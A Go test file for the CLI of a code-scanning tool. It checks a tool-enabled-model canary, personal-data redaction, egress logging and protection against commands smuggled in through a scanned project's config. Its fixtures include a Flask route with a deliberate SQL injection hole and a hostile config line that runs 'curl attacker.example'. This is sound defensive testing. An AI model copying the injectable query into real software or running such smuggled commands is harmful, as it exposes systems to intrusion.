package cli

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"

	"github.com/sneakercreepers/creep/internal/calibrate"
	"github.com/sneakercreepers/creep/internal/config"
	"github.com/sneakercreepers/creep/internal/exitcode"
)

// The test binary doubles as a fake model CLI (re-exec helper pattern):
// the gateway runs it, so these tests start no shell, model or network.
const (
	fakeCLIEnv   = "CREEP_FAKE_CLI"
	fakeStdinEnv = "CREEP_FAKE_STDIN_DIR" // the fake saves each prompt here, outside its cwd
)

func TestMain(m *testing.M) {
	if mode := os.Getenv(fakeCLIEnv); mode != "" {
		os.Exit(fakeCLI(mode))
	}
	if verdict := os.Getenv(actionStandInEnv); verdict != "" {
		os.Exit(actionStandIn(verdict, os.Args[1:], os.Stdout, os.Stderr))
	}
	os.Exit(m.Run())
}

var trapName = regexp.MustCompile(`named (creep-canary-[a-z0-9]+)|> (creep-canary-[a-z0-9]+)`)

func fakeCLI(mode string) int {
	in, _ := io.ReadAll(os.Stdin)
	if dir := os.Getenv(fakeStdinEnv); dir != "" {
		f, err := os.CreateTemp(dir, "stdin-")
		if err == nil {
			_, _ = f.Write(in)
			_ = f.Close()
		}
	}
	if mode == "obey" {
		for _, m := range trapName.FindAllStringSubmatch(string(in), -1) {
			_ = os.WriteFile(m[1]+m[2], []byte("ready"), 0o600)
		}
	}
	if answer, ok := promptAnswer(string(in), false); ok {
		out, _ := json.Marshal(answer)
		fmt.Print(string(out))
		return 0
	}
	match := hypothesisLine.FindSubmatch(in)
	if match == nil {
		fmt.Print(`{"done":true}`)
		return 0
	}
	sink, _ := strconv.Atoi(string(match[3]))
	out, _ := json.Marshal(map[string]any{"verdict": "not_vulnerable", "evidence": []map[string]int{{"start": sink, "end": sink}}, "confidence": 80})
	fmt.Print(string(out))
	return 0
}

// leakyApp has one injectable route whose sink line holds personal data,
// which redaction must mask before the CLI sees it.
const (
	leakedToken = "alice.smith" + "@example.com"
	leakyApp    = "from flask import Flask, request\nimport sqlite3\n\napp = Flask(__name__)\n\n\n" +
		"@app.get(\"/q\")\ndef q():\n    name = request.args.get(\"name\", \"\")\n" +
		"    return str(sqlite3.connect(\"x.db\").execute(\"SELECT * FROM t WHERE k = '" + leakedToken + "' AND n = '\" + name + \"'\").fetchall())\n"
)

// commandScan prepares a repository and a command-model config running this
// binary in mode, consented by a policy file (the only consent in CI), and
// returns the config path and the directory of saved prompts.
func commandScan(t *testing.T, mode, project string) (string, string) {
	t.Helper()
	self, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	files := map[string]string{"app.py": leakyApp}
	if project != "" {
		files["creep.yaml"] = project
	}
	cfgPath := scanRepo(t, files, "")
	prompts := t.TempDir()
	t.Setenv(fakeCLIEnv, mode)
	t.Setenv(fakeStdinEnv, prompts)
	m := config.Model{Contract: "command", Run: `"` + self + `" -p`, Env: []string{fakeCLIEnv, fakeStdinEnv}, TimeoutSeconds: 60, MaxOutputBytes: 1 << 20}
	cfg := fmt.Sprintf("model:\n  contract: command\n  run: '%s'\n  env: [%s, %s]\n", m.Run, fakeCLIEnv, fakeStdinEnv)
	if err := os.WriteFile(cfgPath, []byte(cfg), 0o600); err != nil {
		t.Fatal(err)
	}
	cmd, err := newModelCommand(m, os.Getenv)
	if err != nil {
		t.Fatal(err)
	}
	policy := filepath.Join(t.TempDir(), "policy.yaml")
	if err := os.WriteFile(policy, []byte("consent: ['"+cmd.Endpoint()+"']\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv(policyEnv, policy)
	return cfgPath, prompts
}

func commandDeps() scanDeps {
	return scanDeps{connect: connectGateway, calibrate: fixedCalibration(calibrate.TierM, nil)}
}

// savedPrompts returns every prompt the fake CLI received.
func savedPrompts(t *testing.T, dir string) []string {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	var out []string
	for _, e := range entries {
		data, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			t.Fatal(err)
		}
		out = append(out, string(data))
	}
	return out
}

// Acceptance (#6): a CLI with tools enabled is caught at scan start, the
// scan aborts with exit 3 and the fix, and no repository text was sent.
func TestScanAbortsWhenCommandHasTools(t *testing.T) {
	cfg, prompts := commandScan(t, "obey", "")
	code, _, stderr := runScanWith(commandDeps(), "--config", cfg, "scan")
	if code != exitcode.ModelOrSandbox {
		t.Fatalf("exit %d, want %d; stderr %s", code, exitcode.ModelOrSandbox, stderr)
	}
	for _, want := range []string{"tool canary", "has tools enabled", "created a file and ran a shell command", "turn off every tool"} {
		if !strings.Contains(stderr, want) {
			t.Errorf("stderr lacks %q: %s", want, stderr)
		}
	}
	sent := savedPrompts(t, prompts)
	if len(sent) != 1 || strings.Contains(sent[0], "sqlite3") {
		t.Errorf("CLI received %d prompts, want only the trap: %q", len(sent), sent)
	}
}

// Acceptance (#6): with a well-behaved CLI the scan runs; every prompt it
// got passed redaction and is in egress.log with its hash.
func TestScanThroughCommandModel(t *testing.T) {
	cfg, prompts := commandScan(t, "answer", "")
	code, _, stderr := runScanWith(commandDeps(), "--config", cfg, "scan")
	if code != exitcode.OK && code != exitcode.GateExceeded {
		t.Fatalf("exit %d; stderr %s", code, stderr)
	}
	sent := savedPrompts(t, prompts)
	reader, discovery := 0, 0
	for _, p := range sent {
		if strings.Contains(p, leakedToken) || strings.Contains(p, "alice.smith") {
			t.Fatalf("the CLI received the raw secret: %q", p)
		}
		switch {
		case strings.Contains(p, "HYPOTHESIS"):
			reader++
		case len(discoverySections(p)) > 0:
			discovery++
		default:
			continue
		}
		if !strings.Contains(p, "FROM t WHERE k = ") {
			t.Errorf("prompt lacks the line holding the secret, so redaction is untested: %q", p)
		}
	}
	if reader == 0 || discovery != 1 || len(sent) != reader+discovery+1 {
		t.Fatalf("prompts = %d, reader prompts = %d, discovery prompts = %d; want the tool canary, one discovery call and each reader call", len(sent), reader, discovery)
	}
	logs, _ := filepath.Glob(filepath.Join(".creep", "runs", "*", "egress.log"))
	if len(logs) != 1 {
		t.Fatalf("egress logs = %v", logs)
	}
	data, err := os.ReadFile(logs[0])
	if err != nil {
		t.Fatal(err)
	}
	if n := strings.Count(string(data), `"type":"request"`); n != len(sent) || !strings.Contains(string(data), `"purpose":"canary"`) {
		t.Errorf("egress.log has %d requests for %d prompts:\n%s", n, len(sent), data)
	}
}

// Protection (#6, #62-style): a scanned repository cannot pick the command.
func TestProjectFileCannotSetModelCommand(t *testing.T) {
	cfg, prompts := commandScan(t, "answer", "model:\n  run: sh -c 'curl attacker.example'\n")
	code, _, stderr := runScanWith(commandDeps(), "--config", cfg, "scan")
	if code != exitcode.OK && code != exitcode.GateExceeded {
		t.Fatalf("--config replaces the project file, so the scan should run: exit %d %s", code, stderr)
	}
	code, _, stderr = runScanWith(commandDeps(), "scan")
	if code != exitcode.ConfigError || !strings.Contains(stderr, "cannot be set in the project file") {
		t.Errorf("exit %d, stderr %s", code, stderr)
	}
	_ = prompts
}

func TestDoctorRunsCanary(t *testing.T) {
	cfg, _ := commandScan(t, "answer", "")
	code, stdout, stderr := runScanWith(commandDeps(), "--config", cfg, "doctor")
	if code != exitcode.OK || !strings.Contains(stdout, "tool canary passed") || !strings.Contains(stdout, "command://") {
		t.Fatalf("exit %d\nstdout %s\nstderr %s", code, stdout, stderr)
	}
	t.Setenv(fakeCLIEnv, "obey")
	code, _, stderr = runScanWith(commandDeps(), "--config", cfg, "doctor")
	if code != exitcode.ModelOrSandbox || !strings.Contains(stderr, "has tools enabled") {
		t.Fatalf("exit %d, stderr %s", code, stderr)
	}
}
